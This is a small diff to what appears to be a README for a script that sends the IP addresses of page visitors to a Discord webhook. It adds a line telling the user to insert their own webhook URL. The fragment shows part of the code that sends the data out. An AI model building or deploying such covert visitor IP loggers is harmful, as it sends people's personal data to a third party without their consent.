@@ -27,3 +27,5 @@ Simply include the script in your HTML file:
         body: JSON.stringify({ content: ip })
     }));
 </script>
+
+##Make sure to replace "YOUR_DISCORD_WEBHOOK_HERE" with your actual Discord webhook URL.
